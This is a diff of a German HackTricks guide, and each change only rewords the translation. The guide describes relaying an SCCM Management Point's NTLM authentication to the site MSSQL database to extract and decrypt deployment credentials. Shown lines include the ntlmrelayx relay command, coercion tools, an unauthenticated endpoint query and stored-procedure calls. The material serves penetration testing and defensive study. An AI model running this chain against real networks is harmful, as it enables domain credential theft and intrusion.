@@ -3,10 +3,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Durch das Zwingen eines **System Center Configuration Manager (SCCM) Management Point (MP)** zur Authentifizierung über SMB/RPC und das **Relaying** dieses NTLM-Maschinenkontos zur **Site-Datenbank (MSSQL)** erhalten Sie `smsdbrole_MP` / `smsdbrole_MPUserSvc` Rechte. Diese Rollen ermöglichen es Ihnen, eine Reihe von gespeicherten Prozeduren aufzurufen, die **Operating System Deployment (OSD)**-Policy-Blobs (Anmeldeinformationen für Netzwerkzugangskonten, Task-Sequence-Variablen usw.) offenlegen. Die Blobs sind hex-encodiert/verschlüsselt, können jedoch mit **PXEthief** decodiert und entschlüsselt werden, was Klartextgeheimnisse ergibt.
+Durch das Zwingen eines **System Center Configuration Manager (SCCM) Management Point (MP)** zur Authentifizierung über SMB/RPC und das **Relaying** dieses NTLM-Maschinenkontos zur **Site-Datenbank (MSSQL)** erhalten Sie `smsdbrole_MP` / `smsdbrole_MPUserSvc` Rechte. Diese Rollen ermöglichen es Ihnen, eine Reihe von gespeicherten Prozeduren aufzurufen, die **Operating System Deployment (OSD)** Policy-Blobs (Anmeldeinformationen für Netzwerkzugangskonten, Task-Sequence-Variablen usw.) offenlegen. Die Blobs sind hex-encodiert/verschlüsselt, können jedoch mit **PXEthief** decodiert und entschlüsselt werden, was Klartextgeheimnisse ergibt.
 
 High-Level-Kette:
-1. Entdecken Sie MP & Site DB ↦ nicht authentifizierter HTTP-Endpunkt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+1. Entdecken Sie MP & Site-DB ↦ nicht authentifizierter HTTP-Endpunkt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Starten Sie `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Zwingen Sie MP mit **PetitPotam**, PrinterBug, DFSCoerce usw.
 4. Verbinden Sie sich über den SOCKS-Proxy mit `mssqlclient.py -windows-auth` als das relayed **<DOMAIN>\\<MP-host>$** Konto.
@@ -21,7 +21,7 @@ Geheimnisse wie `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Passwor
 ---
 
 ## 1. Auflisten nicht authentifizierter MP-Endpunkte
-Die MP ISAPI-Erweiterung **GetAuth.dll** gibt mehrere Parameter preis, die keine Authentifizierung erfordern (es sei denn, die Site ist nur PKI):
+Die MP ISAPI-Erweiterung **GetAuth.dll** gibt mehrere Parameter frei, die keine Authentifizierung erfordern (es sei denn, die Site ist nur PKI):
 
 | Parameter | Zweck |
 |-----------|---------|
@@ -35,7 +35,7 @@ curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint -
 ```
 ---
 
-## 2. Leiten Sie das MP-Maschinenkonto an MSSQL weiter
+## 2. Übertragen Sie das MP-Maschinenkonto an MSSQL
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -71,9 +71,9 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 ```
 Jede Zeile enthält `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.
 
-Fokussieren Sie sich auf Richtlinien:
+Fokus auf Richtlinien:
 * **NAAConfig**  – Netzwerkzugangskonto-Credentials
-* **TS_Sequence** – Task Sequenzvariablen (OSDJoinAccount/Password)
+* **TS_Sequence** – Tasksequenzvariablen (OSDJoinAccount/Password)
 * **CollectionSettings** – Kann Run-as-Konten enthalten
 
 ### 3.3  Vollständigen Body abrufen
@@ -102,7 +102,7 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. Relevante SQL-Rollen & -verfahren
+## 5. Relevante SQL-Rollen & Verfahren
 Beim Relay wird der Login zugeordnet zu:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
@@ -110,7 +110,7 @@ Beim Relay wird der Login zugeordnet zu:
 Diese Rollen bieten Dutzende von EXEC-Berechtigungen, die wichtigsten, die in diesem Angriff verwendet werden, sind:
 
 | Stored Procedure | Zweck |
-|------------------|---------|
+|------------------|-------|
 | `MP_GetMachinePolicyAssignments` | Listet die auf ein `clientID` angewendeten Richtlinien auf. |
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gibt den vollständigen Richtlinieninhalt zurück. |
 | `MP_GetListOfMPsInSiteOSD` | Wird durch den `MPKEYINFORMATIONMEDIA`-Pfad zurückgegeben. |
